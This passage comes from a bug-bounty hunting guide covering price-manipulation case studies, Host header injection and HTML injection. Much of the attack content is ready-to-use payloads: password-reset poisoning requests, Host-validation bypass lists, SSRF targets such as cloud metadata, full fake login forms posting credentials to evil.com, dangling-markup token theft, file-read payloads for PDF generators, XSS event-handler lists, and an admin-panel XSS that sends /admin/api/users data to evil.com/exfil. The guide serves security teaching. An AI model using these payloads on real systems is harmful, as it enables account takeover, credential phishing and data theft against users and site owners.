→ Apply 5 promos to a $30 ride → $50 off → ride is FREE + $20 credit
→ Race condition allowed applying same promo multiple times

Root cause: No mutex/lock on promo application endpoint
```

### Case 4: PayPal — Currency Conversion Exploit ($7,500)

```
Platform: PayPal
Bounty: $7,500

Discovery:
→ PayPal allowed selecting payment currency at checkout
→ The exchange rate used for display was different from the charge rate
→ By switching currencies at the right moment in the flow,
   you could pay less than the actual converted amount
→ Difference accumulated over multiple transactions

Root cause: Exchange rate not locked at the start of transaction
```

### Case 5: Amazon (via HackerOne) — Quantity Integer Overflow ($10,000)

```
Platform: Major e-commerce (via HackerOne)
Bounty: $10,000

Discovery:
→ Quantity field accepted 32-bit integer
→ Setting quantity to 2,147,483,648 (int32 max + 1) → overflowed to 0
→ Price: $50 × 0 = $0
→ But order system still processed 1 item
→ Free purchase!

Root cause: Integer overflow not handled, quantity used for price
            calculation but not for fulfillment
```

---

## 19. 🎯 Price Manipulation Hunting Methodology

### The Systematic Approach

```
Phase 1: MAP THE MONEY FLOW (30 minutes)
├── Use the site normally, buy something with Burp recording
├── Document EVERY request in the purchase flow
├── Note where prices appear in requests:
│   ├── Which parameter contains the price?
│   ├── Which parameter contains the quantity?
│   ├── Which parameter contains the product ID?
│   ├── Are there hidden parameters (tax, shipping, discount)?
│   └── Is there a "total" field sent from the client?
├── Map the complete checkout flow (all steps, all endpoints)
└── Check for API endpoints (/api/v1/cart, /api/v1/checkout, etc.)

Phase 2: TEST DIRECT PRICE TAMPERING (15 minutes)
├── In Burp Repeater, modify price → 0.01, 0, -1
├── Modify quantity → 0, -1, 99999999
├── Modify product_id → swap cheap/expensive products
├── Modify total → set to 0.01
├── Remove price parameter entirely
├── Add extra price parameter (parameter pollution)
└── Check: does the server RECALCULATE or TRUST your values?

Phase 3: TEST COUPON/DISCOUNT LOGIC (15 minutes)
├── Apply coupon → intercept → apply same coupon again
├── Try applying multiple different coupons
├── Send parallel coupon requests (race condition)
├── Modify coupon discount value in request
├── Try known expired coupons
├── Brute force coupon codes
└── Search JS/source for hardcoded coupon codes

Phase 4: TEST FLOW MANIPULATION (15 minutes)
├── Skip checkout steps (go directly to confirmation)
├── Go backwards in the flow (add items after price locked)
├── Change shipping method after price calculated
├── Mix currencies during checkout
├── Complete partial payment then change cart
└── Test timeout behavior (start checkout, wait, add items)

Phase 5: TEST RACE CONDITIONS (10 minutes)
├── Send duplicate purchase requests simultaneously
├── Send duplicate coupon applications simultaneously
├── Send duplicate balance transfers simultaneously
├── Use Turbo Intruder for precise timing
└── Check for double-processing

Phase 6: TEST SUBSCRIPTION LOGIC (10 minutes)
├── Modify plan_id in upgrade request
├── Modify price in subscription request
├── Downgrade and check if features persist
├── Extend trial via parameter tampering
├── Cancel and check if features persist
└── Modify seat count in team plans

Phase 7: DOCUMENT & REPORT (10 minutes)
├── Calculate the FINANCIAL IMPACT
├── Show the exact request/response proving manipulation
├── Calculate how much money could be stolen at scale
├── Provide remediation advice:
│   → NEVER trust client-side price values
│   → Always calculate totals server-side from product catalog
│   → Implement idempotency keys for payments
│   → Use database-level locks for balance operations
│   → Rate limit coupon application endpoints
└── Include CVSS score
```

---

<!-- ═══════════════════════════════════════════════════════════════ -->
<!--              PART C: HOST HEADER INJECTION                       -->
<!-- ═══════════════════════════════════════════════════════════════ -->

# PART C — 🟣 Host Header Injection

---

## 20. 🌍 What Is Host Header Injection?

### The HTTP Host Header

```
Every HTTP/1.1 request MUST include a Host header:

GET /login HTTP/1.1
Host: app.target.com        ← This one!
Cookie: session=abc123

WHY it exists:
→ A single server can host MULTIPLE websites (virtual hosting)
→ Server IP 203.0.113.1 hosts: app.target.com, blog.target.com, admin.target.com
→ The Host header tells the server WHICH site you want

The problem:
→ The Host header is SENT BY THE CLIENT (attacker-controlled!)
→ But servers TRUST it for critical operations:
   ├── Building URLs (password reset links)
   ├── Routing requests (virtual hosting)
   ├── Generating cache keys
   ├── Loading configuration
   └── Determining which application to serve
```

### Why Apps Trust the Host Header

```
Because developers NEED the hostname to build URLs:

# Python Flask — needs to build absolute URLs
@app.route('/reset-password')
def reset_password():
    token = generate_reset_token(user)
    # How does the server know its own hostname?
    # Option 1: Hardcode it (safe but inflexible)
    link = f"https://app.target.com/reset?token={token}"
    
    # Option 2: Read from Host header (dangerous!)
    link = f"https://{request.host}/reset?token={token}"
    
    # Option 3: Framework URL builder (depends on config)
    link = url_for('reset_confirm', token=token, _external=True)
    # ↑ Flask reads Host header for _external=True!

The CONVENIENT approach (read Host) is the DANGEROUS approach.
Most frameworks default to reading Host for URL generation.
```

### The Host Header Attack Surface

```
┌─────────────────────────────────┬──────────┬────────────────────────┐
│ Attack                          │ Severity │ Impact                 │
├─────────────────────────────────┼──────────┼────────────────────────┤
│ Password reset poisoning        │ High     │ Account takeover       │
│ Web cache poisoning             │ Critical │ Mass XSS / defacement  │
│ SSRF via Host header            │ High     │ Internal service access │
│ Server-side template injection  │ Critical │ RCE (sometimes)        │
│ SQL injection via Host          │ Critical │ Database access         │
│ Routing to internal apps        │ High     │ Access hidden services  │
│ Business logic bypass           │ Medium   │ Bypass restrictions     │
│ Open redirect via Host          │ Medium   │ Phishing                │
└─────────────────────────────────┴──────────┴────────────────────────┘
```

---

## 21. ⚙️ How Host Header Injection Works

### The Mechanics

```
Normal password reset flow:

1. User requests password reset
2. Server generates token + builds reset URL
3. Server uses Host header to build the URL:
   reset_link = f"https://{request.headers['Host']}/reset?token={SECRET}"
4. Email sent: "Click here to reset: https://app.target.com/reset?token=SECRET"

Attack flow:

1. Attacker requests password reset for VICTIM's account
2. But modifies the Host header:
   POST /forgot-password HTTP/1.1
   Host: evil.com                    ← INJECTED!
   email=victim@target.com
   
3. Server builds URL using injected Host:
   reset_link = f"https://evil.com/reset?token={SECRET}"
   
4. Email sent to VICTIM: "Click here: https://evil.com/reset?token=SECRET"
   
5. Victim clicks link → goes to evil.com → attacker captures the token!
   
6. Attacker uses token: https://app.target.com/reset?token=SECRET
   → Resets victim's password → ACCOUNT TAKEOVER!
```

### The Proxy Complication

```
Most modern apps sit behind a reverse proxy:

Browser → Reverse Proxy (nginx) → Application Server

The proxy often:
1. Overwrites the Host header with the backend address
2. Sets X-Forwarded-Host to the ORIGINAL Host value

So even if the app checks Host → it might be safe
BUT: the app might use X-Forwarded-Host instead!

Application code:
host = request.headers.get('X-Forwarded-Host') or request.headers.get('Host')
# ← If attacker can set X-Forwarded-Host, same vulnerability!
```

### What Makes a Server Vulnerable?

```
Vulnerable if ANY of these are true:

1. App uses Host/X-Forwarded-Host to build URLs
   → Password reset links, email verification links,
     OAuth redirect URLs, asset URLs

2. App uses Host for routing decisions
   → "If Host == admin.target.com → show admin panel"

3. App includes Host in responses (reflection)
   → Meta tags, canonical URLs, redirects, script sources

4. App uses Host in server-side operations
   → Database queries, file paths, template loading,
     config lookups

5. Reverse proxy passes Host/X-Forwarded-Host unmodified
   → No whitelist validation → injection possible
```

---

## 22. 🔑 Password Reset Poisoning

The #1 Host Header attack. Found on more targets than any other variant.

### The Full Attack Walkthrough

```
Step 1: IDENTIFY the reset flow

Visit /forgot-password → enter victim's email → submit
Intercept in Burp:

POST /forgot-password HTTP/1.1
Host: app.target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=...

email=victim@company.com

Response: 200 OK — "If this email exists, a reset link has been sent"

Step 2: TEST Host header injection

Replay the request with modified Host:

POST /forgot-password HTTP/1.1
Host: evil.burpcollaborator.net          ← Changed!
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com                   ← Use YOUR email first!

Check YOUR email: What does the reset link look like?
→ https://evil.burpcollaborator.net/reset?token=abc123  → VULNERABLE!
→ https://app.target.com/reset?token=abc123  → Host header not used, safe

Step 3: CHECK for X-Forwarded-Host

If Host change causes error (502/400), try these alternatives:

POST /forgot-password HTTP/1.1
Host: app.target.com
X-Forwarded-Host: evil.com              ← Try this

Or:
Host: app.target.com
X-Host: evil.com

Or:
Host: app.target.com
X-Forwarded-Server: evil.com

Or:
Host: app.target.com
Forwarded: host=evil.com

Step 4: EXPLOIT (against victim)

Once confirmed, target the victim:

POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@company.com

→ Victim gets email: "Reset your password: https://evil.com/reset?token=REAL_TOKEN"
→ Victim clicks → token sent to evil.com
→ Attacker uses token on real site → password reset → ATO!
```

### Why Victims Click

```
"But the victim would notice evil.com in the link!"

Not necessarily:
1. Email clients don't always show full URLs
   → "Reset your password" as a clickable button
   → Mobile email apps show only the link text

2. Attacker can use look-alike domains:
   → app-target.com
   → app.target.com.evil.com
   → app.target-security.com
   → target-reset.com

3. Victims don't inspect password reset links
   → They're expecting the email
   → They just click "Reset Password"

4. Even WITHOUT clicking:
   → Some email clients PREFETCH links automatically
   → Token leaked to attacker via the prefetch!
   
5. Some email apps/previews load images from the link:
   → <img src="https://evil.com/reset?token=..."> in email body
   → If email renders HTML → token sent to evil.com!
```

### Bypasses When Basic Host Change Fails

```
Bypass 1: Add port with Host
Host: app.target.com:evil.com
→ Some parsers split on ":" → hostname = "app.target.com"
→ But URL builder uses full value → https://app.target.com:evil.com/reset

Bypass 2: Absolute URL in request line
GET https://app.target.com/forgot-password HTTP/1.1
Host: evil.com
→ HTTP spec: if request has absolute URL, Host is ignored
→ Request goes to target.com, but Host is evil.com

Bypass 3: Duplicate Host headers
Host: app.target.com
Host: evil.com
→ Proxy uses first Host → routes to target.com
→ App uses second Host → builds URL with evil.com

Bypass 4: Line wrapping
Host: app.target.com
 evil.com
→ Some parsers treat whitespace-prefixed line as continuation
→ Host = "app.target.com evil.com" or "app.target.com\nevil.com"

Bypass 5: @ symbol
Host: evil.com@app.target.com
→ URL parsing: https://evil.com@app.target.com/reset
→ In URL format: user@host → credentials@hostname
→ Browser goes to app.target.com with "user" evil.com
→ But email might show the URL differently

Bypass 6: Tab/space injection
Host: app.target.com\tevil.com
Host: app.target.com evil.com

Bypass 7: Underscore / subdomain
Host: evil_app.target.com
→ If wildcard DNS or virtual host matching is loose
```

---

## 23. 🗄️ Web Cache Poisoning via Host

### The Attack

```
If a CDN/cache sits in front of the app and caches responses:

1. Attacker sends:
GET /login HTTP/1.1
Host: app.target.com
X-Forwarded-Host: evil.com

2. Server generates response with evil.com in asset URLs:
<html>
<script src="https://evil.com/static/app.js"></script>   ← Poisoned!
</html>

3. Cache stores this response for key: GET /login + app.target.com

4. ALL users visiting /login get the cached response:
<script src="https://evil.com/static/app.js"></script>
→ Attacker's JavaScript runs for EVERY visitor!
→ Mass XSS / credential theft / defacement!
```

### Testing for Cache Poisoning

```
Step 1: Find pages that are cached
→ Send same request twice → check response headers:
   X-Cache: HIT → page is cached
   X-Cache: MISS → not cached (or first request)
   Age: 300 → cached for 300 seconds
   Cache-Control: public, max-age=3600 → cacheable

Step 2: Find reflected Host/X-Forwarded-Host
→ Send request with modified header
→ Check if response body contains your injected value
→ Check HTML source for your domain name

Step 3: Poison the cache
→ Send the malicious request
→ Check: is the poisoned response cached?
→ Visit the page in a different browser/session → cached version?

Step 4: Verify impact
→ Does the poisoned page load attacker's JavaScript?
→ How long does the cache persist? (check Cache-Control)
→ How many pages can be poisoned?

⚠️ IMPORTANT: Test carefully!
→ Cache poisoning affects ALL users
→ Only test on pages you can easily invalidate
→ Contact the program first if unsure
→ Use cache busters (?cb=random) during testing to avoid affecting real users
```

---

## 24. 🕳️ SSRF via Host Header

```
If the server uses the Host header to make internal requests:

Scenario: App connects to backend API using Host header:
backend_url = f"http://{request.host}/api/internal/data"

Normal:
Host: app.target.com → http://app.target.com/api/internal/data

Attack:
Host: 169.254.169.254 → http://169.254.169.254/api/internal/data
→ Cloud metadata endpoint! Leaks AWS/GCP credentials!

Host: 127.0.0.1:8080 → http://127.0.0.1:8080/api/internal/data
→ Access internal admin panels!

Host: internal-db.target.local → http://internal-db.target.local/...
→ Access internal services!

Also try:
Host: 0.0.0.0
Host: [::1]         ← IPv6 localhost
Host: 0177.0.0.1    ← Octal 127.0.0.1
Host: 2130706433    ← Decimal 127.0.0.1
Host: 0x7f000001    ← Hex 127.0.0.1
```

---

## 25. 🔓 Bypass Techniques for Host Validation

### When the Server Validates Host Header

```
Some servers check that Host matches expected values.
Here's how to bypass:

Validation: Host must be "app.target.com"

Bypass 1: Add port
Host: app.target.com:443
Host: app.target.com:evil
Host: app.target.com:80@evil.com

Bypass 2: Use X-Forwarded-Host (processed after Host validation)
Host: app.target.com          ← passes validation
X-Forwarded-Host: evil.com   ← used for URL generation

Bypass 3: Absolute URL
GET https://app.target.com/forgot-password HTTP/1.1
Host: evil.com

Bypass 4: Double Host
Host: app.target.com
Host: evil.com

Bypass 5: URL-encoded values
Host: app.target.com%0d%0aX-Injected:%20true

Bypass 6: Unicode normalization
Host: app.tаrget.com  ← 'а' is Cyrillic, not Latin 'a'

Bypass 7: Override headers (try ALL of these)
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Original-Host: evil.com
Forwarded: host=evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
X-Forwarded-Scheme: evil.com
X-Real-Host: evil.com

Bypass 8: Subdomain match bypass
If validation checks: host.endswith('.target.com')
→ Host: evil.target.com  (set up DNS for this!)
→ Host: evil-target.com  (different domain)
```

---

## 26. 🎯 Host Header Injection Methodology

### The Systematic Approach

```
Step 1: BASELINE (2 minutes)
├── Send normal request, note response
├── Check what headers the server reflects
└── Identify password reset / email verification endpoints

Step 2: BASIC HOST INJECTION (5 minutes)
├── Change Host header to evil.com → check response
├── If 400/502 → server validates Host
├── If 200 + evil.com in response → VULNERABLE!
└── Check: is evil.com in any URL, link, or meta tag?

Step 3: ALTERNATIVE HEADERS (5 minutes)
├── X-Forwarded-Host: evil.com
├── X-Host: evil.com
├── Forwarded: host=evil.com
├── X-Forwarded-Server: evil.com
├── (test each one individually, then combinations)
└── Check response after each test

Step 4: BYPASS TECHNIQUES (10 minutes)
├── Duplicate Host headers
├── Host with port: target.com:evil
├── Absolute URL in request line
├── Space/tab injection in Host
├── URL-encoded Host values
└── Test each bypass against each endpoint

Step 5: PASSWORD RESET POISONING (10 minutes)
├── Trigger password reset with modified Host
├── Use YOUR email first (proof of concept)
├── Check email: is the reset URL poisoned?
├── Try all alternative headers (X-Forwarded-Host, etc.)
└── Document the exact request that works

Step 6: CACHE POISONING (10 minutes)
├── Check if pages are cached (X-Cache header)
├── Test Host reflection on cached pages
├── Use cache buster during testing (?cb=random)
├── If reflection + caching → cache poisoning!
└── Document cache TTL and affected pages

Step 7: SSRF (5 minutes)
├── Host: 127.0.0.1
├── Host: 169.254.169.254
├── Host: internal-hostname
├── Check for unusual responses or errors
└── Check response time (longer = server made internal request)

Step 8: REPORT
├── Exact request/response showing injection
├── Impact analysis (ATO, cache poisoning, SSRF)
├── Screenshots of poisoned email/page
├── CVSS score
└── Remediation: always use a hardcoded/config hostname for URL generation
```

---

<!-- ═══════════════════════════════════════════════════════════════ -->
<!--                    PART D: HTML INJECTION                        -->
<!-- ═══════════════════════════════════════════════════════════════ -->

# PART D — 🔵 HTML Injection

---

## 27. 📄 What Is HTML Injection?

### HTML Injection vs XSS — The Critical Distinction

```
HTML Injection: Injecting HTML tags that DON'T execute JavaScript
XSS: Injecting HTML/JS tags that DO execute JavaScript

Example — HTML Injection:
Input: <h1>HACKED</h1>
Result: Page displays "HACKED" in large text
→ No JavaScript → No cookie theft → HTML Injection (not XSS)

Example — XSS:
Input: <script>alert(document.cookie)</script>
Result: JavaScript executes, cookies stolen
→ JavaScript runs → XSS

WHY HTML Injection matters even without JavaScript:
├── 🎣 Phishing: Inject a fake login form → steal credentials
├── 📝 Content Spoofing: Change what users see on the page
├── 🖼️ UI Redress: Inject content that tricks users into actions
├── 📧 Email Injection: Inject HTML into emails → phishing at scale
├── 📊 SEO Poisoning: Inject hidden links → manipulate search rankings
└── ⬆️ Escalation: HTML injection → sometimes leads to XSS

Severity comparison:
HTML Injection alone: Low-Medium ($50-$500)
HTML Injection + Phishing PoC: Medium ($200-$2,000)
HTML Injection → XSS escalation: Medium-High ($500-$10,000)
```

### Where HTML Gets Injected

```
Anywhere user input is rendered in an HTML context WITHOUT proper escaping:

1. REFLECTED (in URL parameters):
   https://target.com/search?q=<h1>test</h1>
   → Page shows: <h1>test</h1> rendered as heading

2. STORED (in database):
   Profile bio: <h1>About Me</h1><p>This is fake content</p>
   → Saved to database → displayed to all visitors

3. DOM-based (client-side):
   document.getElementById('output').innerHTML = userInput;
   → JavaScript inserts raw HTML into the page

4. IN EMAILS:
   "Your order #<b>ORDER_ID</b> has been confirmed"
   → If ORDER_ID contains HTML → rendered in email client

5. IN PDFs / Documents:
   Invoice generation using HTML templates
   → Input rendered in PDF → HTML injection in documents

6. IN ERROR MESSAGES:
   "User '<h1>HACKED</h1>' not found"
   → Error page renders the injected HTML

7. IN HTTP HEADERS (via CRLF):
   Response body injection via \r\n\r\n
   → Full HTML control in response
```

### The Mental Model

```
Think of HTML Injection as: CONTENT CONTROL without CODE EXECUTION

You can't steal cookies (no JavaScript)
You can't redirect (no JavaScript)
You CAN:
├── Show fake content
├── Display a fake login form
├── Inject invisible iframes
├── Inject phishing messages
├── Modify the visual appearance of the page
├── Inject links to malicious sites
├── Hide existing page content and replace it
└── Sometimes bypass filters and escalate to XSS

The real danger: A user sees your injected content on a TRUSTED DOMAIN.
They trust target.com → they trust the fake login form → they enter credentials.
```

---

## 28. 🔀 Types of HTML Injection

### Type 1: Reflected HTML Injection

```
User input in URL immediately reflected on the page:

URL: https://target.com/search?q=<h1>IMPORTANT NOTICE</h1>
<p>Your account has been compromised. 
<a href="https://evil.com/login">Click here to secure it</a></p>

Page renders:
┌──────────────────────────────────────────────────────────────────┐
│ Search results for:                                              │
│                                                                  │
│ ╔═══════════════════════════════════════╗                        │
│ ║ IMPORTANT NOTICE                      ║                        │
│ ║ Your account has been compromised.    ║                        │
│ ║ Click here to secure it               ║                        │
│ ╚═══════════════════════════════════════╝                        │
│                                                                  │
│ The user sees this on target.com's domain!                      │
│ → Trusts it → clicks → goes to evil.com → enters credentials   │
└──────────────────────────────────────────────────────────────────┘

Detection:
→ Put HTML tags in EVERY input parameter
→ Check if they render as HTML (not as text)
→ View source: is your input inside HTML unescaped?
```

### Type 2: Stored HTML Injection

```
HTML saved to database and displayed to other users:

Injection points:
├── Profile name / bio / about
├── Comments / reviews / feedback
├── Forum posts / messages
├── File names (uploaded file name displayed)
├── Team/project names
├── Address fields
├── Custom fields

Example — Inject in profile name:
Name: <div style="position:fixed;top:0;left:0;width:100%;height:100%;
       background:white;z-index:9999;text-align:center;padding-top:200px">
       <h1>Session Expired</h1>
       <form action="https://evil.com/steal">
       <input placeholder="Email" name="email"><br><br>
       <input type="password" placeholder="Password" name="pass"><br><br>
       <button>Sign In</button>
       </form></div>

Anyone viewing your profile sees a fake login page covering the real page!
→ Fills in credentials → sent to evil.com
→ Stored = persistent = affects every visitor
```

### Type 3: HTML Injection via HTTP Headers

```
If HTTP headers are reflected in HTML responses:

Send:
GET / HTTP/1.1
Host: target.com
User-Agent: <h1>Injected</h1>
Referer: <img src=x>

If the server reflects User-Agent in a "browser info" page:
"Your browser: <h1>Injected</h1>"
→ HTML injection via header!

Common headers that get reflected:
├── User-Agent (browser info pages)
├── Referer (analytics, error pages)
├── Accept-Language (language selection pages)
├── X-Forwarded-For (IP display pages)
└── Authorization (error messages)
```

### Type 4: HTML Injection in Emails

```
If the app sends emails with user-controlled content:

Scenario: "Invite a friend" feature
POST /invite HTTP/1.1
{"email": "friend@test.com", "message": "Hey check this out!"}

Attack:
{"email": "victim@test.com", 
 "message": "<h1>URGENT: Account Verification Required</h1>
  <p>Your account will be suspended in 24 hours.</p>
  <p><a href='https://evil.com/verify'>Verify your account now</a></p>"}

The victim receives an email FROM target.com containing:
→ Phishing content that looks legitimate
→ Because it comes from a TRUSTED sender (target.com)
→ Passes spam filters (legitimate sender domain)
→ Victim trusts it → clicks → enters credentials on evil.com
```

### Type 5: HTML Injection in PDF Generation

```
Many apps generate PDFs from HTML templates:
→ Invoices, reports, certificates, receipts, tickets

If user input goes into the PDF template unescaped:

Input name: "Vishal</p><h1>MODIFIED INVOICE</h1>
            <p>Total Due: $0.00<p>"

Generated PDF shows:
Customer: Vishal
MODIFIED INVOICE
Total Due: $0.00

→ Attacker modifies the content of official documents!
→ Invoice fraud, certificate forgery, receipt manipulation

Advanced: Some PDF generators (wkhtmltopdf, Prince) support:
<link rel="stylesheet" href="https://evil.com/style.css">
<img src="https://evil.com/ssrf?internal_data">
→ SSRF via PDF generation!
```

### Type 6: HTML Injection in Markdown

```
Many platforms render Markdown → HTML:
GitHub, GitLab, Notion, Slack, Discord, Jira, etc.

Markdown that produces HTML:
[Click here](https://evil.com)  → <a href="https://evil.com">Click here</a>
![image](https://evil.com/track) → <img src="https://evil.com/track">

But raw HTML in Markdown is often ALSO rendered:
<div style="display:none"><img src="https://evil.com/track"></div>
→ Hidden tracking pixel in a Markdown comment/issue!

<details><summary>Click for answer</summary>
<form action="https://evil.com/steal">
<input placeholder="Enter your API key" name="key">
<button>Submit</button>
</form>
</details>
→ Hidden phishing form in a collapsible section!
```

---

## 29. 🎯 HTML Injection Attack Techniques

### Technique 1: Fake Login Form Injection

```
The most impactful HTML injection attack:

Payload:
<div style="position:absolute;top:0;left:0;width:100%;height:100%;
    background-color:white;z-index:10000;display:flex;
    justify-content:center;align-items:center;">
  <div style="width:400px;padding:40px;border:1px solid #ddd;border-radius:8px;
      box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;">
    <h2 style="margin-bottom:20px;">Session Expired</h2>
    <p style="color:#666;margin-bottom:25px;">
      Please sign in again to continue
    </p>
    <form action="https://evil.com/capture" method="POST">
      <input type="email" name="email" placeholder="Email" 
        style="width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;
        border-radius:4px;box-sizing:border-box;"><br>
      <input type="password" name="password" placeholder="Password"
        style="width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;
        border-radius:4px;box-sizing:border-box;"><br>
      <button type="submit" style="width:100%;padding:12px;
        background-color:#4285f4;color:white;border:none;
        border-radius:4px;cursor:pointer;font-size:16px;margin-top:10px;">
        Sign In
      </button>
    </form>
  </div>
</div>

This renders a professional-looking login form on top of the real page.
On target.com's domain → victim trusts it → enters credentials → stolen.
```

### Technique 2: Content Spoofing / Defacement

```
Replace visible content with attacker's message:

Payload (hide real content, show fake):
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
    background:#fff;z-index:9999;">
  <div style="max-width:800px;margin:50px auto;padding:20px;
      border:2px solid #d32f2f;border-radius:8px;">
    <h1 style="color:#d32f2f;">⚠️ Security Alert</h1>
    <p style="font-size:18px;line-height:1.6;">
      We have detected unauthorized access to your account from 
      a new device. For your security, please verify your identity 
      immediately.
    </p>
    <p style="font-size:18px;">
      <a href="https://evil.com/verify" 
         style="color:#1a73e8;text-decoration:underline;">
        Click here to verify your identity →
      </a>
    </p>
    <p style="color:#666;font-size:12px;">
      This is an automated security notification from the 
      Target.com Security Team.
    </p>
  </div>
</div>

The entire page is replaced with a convincing security alert.
```

### Technique 3: Invisible Data Exfiltration via HTML

```
Even without JavaScript, HTML can "phone home":

Image tag (sends request to attacker's server):
<img src="https://evil.com/log?page=target.com/profile" style="display:none">
→ Attacker's server logs that victim visited this page

CSS background (same effect):
<div style="background:url(https://evil.com/log?visited=true);height:1px;width:1px">

Link prefetch (browser pre-loads the URL):
<link rel="prefetch" href="https://evil.com/track">

Form with auto-submit (no JS needed via CSS):
<form action="https://evil.com/collect" method="GET">
  <input name="data" value="leaked_info">
  <button style="position:fixed;top:0;left:0;width:100%;height:100%;
      opacity:0;cursor:default;">
  </button>
</form>
→ Any click ANYWHERE on the page submits the form!
```

### Technique 4: Dangling Markup Injection

```
When you can inject HTML but can't close existing tags properly:

Page source:
<input type="hidden" name="csrf_token" value="SECRET_TOKEN">
<input type="text" name="search" value="USER_INPUT">

Inject in USER_INPUT:
"><img src="https://evil.com/steal?

Now the page looks like:
<input type="hidden" name="csrf_token" value="SECRET_TOKEN">
<input type="text" name="search" value=""><img src="https://evil.com/steal?">

The <img src="https://evil.com/steal? starts a URL but doesn't close.
The browser reads EVERYTHING after the src=" as part of the URL until 
it finds a closing quote. This can include the CSRF token!

Request to evil.com:
GET /steal?%22%3E%0A%3Cinput%20type=%22hidden%22...value=%22SECRET_TOKEN HTTP/1.1

→ CSRF token exfiltrated via HTML injection (no JavaScript needed)!
```

### Technique 5: Open Redirect via HTML

```
Inject a meta refresh tag:
<meta http-equiv="refresh" content="0;url=https://evil.com">

Or inject a base tag:
<base href="https://evil.com/">
→ ALL relative URLs on the page now point to evil.com!
→ If page has <a href="/login"> → it becomes https://evil.com/login
→ If page loads <script src="/js/app.js"> → loads from evil.com!

The <base> tag injection is extremely powerful:
→ Turns HTML injection into effective XSS (via script loading)
→ Turns all links into phishing links
→ Can steal form submissions (relative action URLs)
```

---

## 30. 🌐 HTML Injection in Modern Contexts

### Rich Text Editors (Markdown, WYSIWYG)

```
Many apps allow "safe" HTML in rich text:
→ Bold, italic, links, images are allowed
→ Scripts, event handlers are blocked

But they often miss:

1. CSS injection for data exfiltration:
<div style="background:url(https://evil.com/track)"></div>

2. Form injection (forms aren't always blocked):
<form action="https://evil.com/steal" method="POST">
<input placeholder="API Key" name="key">
<button>Submit</button>
</form>

3. SVG with event handlers:
<svg onload="alert(1)">     ← often blocked
<svg><use href="https://evil.com/payload.svg#x"></use></svg>  ← sometimes missed

4. Iframe injection (if not blocked):
<iframe src="https://evil.com/phishing" width="100%" height="500"></iframe>

5. Object/embed tags:
<object data="https://evil.com/malicious.swf" type="application/x-shockwave-flash">
<embed src="https://evil.com/malicious.swf">

Test every tag/attribute that the sanitizer ALLOWS.
```

### Email HTML Injection

```
Email clients render HTML differently than browsers:
→ No JavaScript execution (usually)
→ But CSS works
→ Images load (unless blocked by default)
→ Links work
→ Forms work (in some clients!)

Powerful email HTML injection payloads:

1. Tracking pixel:
<img src="https://evil.com/read-receipt?target=victim@email.com" 
     width="1" height="1" style="display:none">
→ Know exactly when victim reads the email

2. CSS-based content hiding:
<style>
.real-content { display: none !important; }
</style>
<div class="real-content">...</div>
<div>Your account has been compromised...</div>
→ Hide real email content, show fake content

3. Clickable overlay:
<a href="https://evil.com/phishing" style="
    position:absolute; top:0; left:0; width:100%; height:100%;
    text-decoration:none; z-index:9999;">
</a>
→ Entire email becomes a phishing link
```

### PDF Generation HTML Injection (wkhtmltopdf, Puppeteer, Prince)

```
If the app uses HTML-to-PDF conversion:

1. SSRF via image/link:
<img src="http://169.254.169.254/latest/meta-data/">
→ AWS metadata included in PDF!

2. Local file read (wkhtmltopdf):
<iframe src="file:///etc/passwd" width="800" height="500">
→ /etc/passwd contents rendered in PDF!

3. JavaScript execution (if enabled in PDF generator):
<script>
x = new XMLHttpRequest();
x.open('GET', 'file:///etc/passwd', false);
x.send();
document.write(x.responseText);
</script>
→ Local file contents in the PDF!

4. External stylesheet:
<link rel="stylesheet" href="https://evil.com/steal.css">
→ PDF generator fetches from evil.com → SSRF

These are HIGH severity findings!
HTML injection in PDF generation → often escalates to SSRF or LFI.
```

---

## 31. ⬆️ Escalating HTML Injection

### Escalation 1: HTML Injection → XSS

```
If the app blocks <script> but allows other HTML:

Bypass attempts:
<img src=x onerror=alert(1)>              ← event handler
<svg onload=alert(1)>                      ← SVG event
<body onload=alert(1)>                     ← body event
<input onfocus=alert(1) autofocus>         ← auto-focus event
<marquee onstart=alert(1)>                 ← marquee event
<details open ontoggle=alert(1)>           ← details event
<video src=x onerror=alert(1)>             ← video event
<audio src=x onerror=alert(1)>             ← audio event

If event handlers are also blocked:
<base href="https://evil.com/">            ← redirect script loading
<link rel="import" href="https://evil.com/xss.html"> ← HTML import
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

If ALL active content is blocked:
→ Stay with HTML injection
→ Use phishing/content spoofing attacks
→ Report as HTML Injection with phishing PoC
```

### Escalation 2: HTML Injection → Credential Theft

```
No XSS needed. Pure HTML phishing:

Step 1: Find HTML injection on a SENSITIVE page
   → Login page, settings page, payment page
   → The more sensitive the page, the more the user trusts it

Step 2: Inject a fake form that matches the site's design:
<form action="https://evil.com/capture" method="POST"
      style="background:#fff;padding:20px;border:1px solid #ddd;
      border-radius:8px;max-width:400px;margin:20px auto;">
  <h3>Verify Your Identity</h3>
  <p>Enter your credentials to continue</p>
  <input name="user" placeholder="Username" 
         style="width:100%;padding:10px;margin:5px 0;box-sizing:border-box;">
  <input name="pass" type="password" placeholder="Password"
         style="width:100%;padding:10px;margin:5px 0;box-sizing:border-box;">
  <button style="width:100%;padding:10px;background:#007bff;
         color:#fff;border:none;border-radius:4px;cursor:pointer;">
    Verify
  </button>
</form>

Step 3: Send the URL with injection to victim:
https://target.com/page?input=<form action=...>

Step 4: Victim sees a login form on target.com → trusts it → enters creds
```

### Escalation 3: HTML Injection → CSRF Token Theft (Dangling Markup)

```
As shown in Technique 4 of Section 29:

If you can inject HTML BEFORE a CSRF token:
"><img src="https://evil.com/steal?data=

The unclosed src attribute captures everything until the next quote,
including the CSRF token value.

This converts HTML Injection → CSRF → potentially any CSRF attack!
```

### Escalation 4: HTML Injection in Admin Context

```
If you can store HTML injection visible to admins:

Inject in a support ticket, feedback form, or user profile:
<img src=x onerror="fetch('/admin/api/users').then(r=>r.text()).then(d=>
  fetch('https://evil.com/exfil',{method:'POST',body:d}))">

If this fires as XSS in the admin panel → admin session stolen!
Even as pure HTML (no XSS) → fake admin notices, phishing forms
```

---

## 32. 🎯 HTML Injection Methodology

### Step-by-Step Hunting Process

```
Phase 1: FIND REFLECTION POINTS (15 minutes)
